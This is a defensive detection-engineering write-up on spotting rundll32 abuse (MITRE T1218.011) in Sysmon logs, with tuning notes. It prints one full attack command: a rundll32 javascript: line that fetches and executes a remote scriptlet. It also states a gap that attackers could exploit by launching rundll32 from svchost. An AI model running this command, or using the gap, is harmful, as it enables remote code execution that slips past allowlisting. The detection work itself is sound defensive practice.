# T1218.011 - Rundll32

Tactic: Defense Evasion
Data source: Sysmon Event ID 1
Tested with: Atomic Red Team T1218.011 Test 1

## What it detects

rundll32.exe being used to pull down and run remote code rather than load a local DLL.
Like regsvr32, it's a signed Microsoft binary so it gets past allowlisting.

## How I tested it

    Invoke-AtomicTest T1218.011 -TestNumbers 1

    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/.../T1218.011.sct").Exec()

javascript: in a rundll32 command line, plus a URL. That's not loading a DLL, that's
fetching a script and executing it.

## Tuning

This one needed real work. 11 hits to start with, 1 was mine.

The other 10 were all svchost.exe launching rundll32 to load legitimate Windows DLLs -
acproxy.dll, sysmain.dll, Windows.StateRepositoryClient.dll, PcaSvc. Windows uses
rundll32 constantly.

My mistake was the condition CommandLine="*.dll,*". Every legitimate rundll32 call
loads a DLL followed by a comma and a function name, so that condition matched
everything and contributed nothing.

What I changed:

- Removed *.dll,* entirely. It described normal rundll32 usage, not abuse.
- Added mshtml and RunHTMLApplication, which are specific to this technique.
- Excluded svchost.exe as a parent, since that's Windows launching rundll32 for its
  own purposes.

11 hits down to 1. 10 false positives removed.

## What's weak about this

Excluding svchost.exe as a parent is a tradeoff. If an attacker got code running
inside a svchost process they could launch rundll32 from there and I'd miss it. I
decided that was acceptable here because getting into svchost is much harder than
the technique I'm detecting, but on a more sensitive system I'd want a different
approach - probably checking whether the DLL being loaded is signed instead.
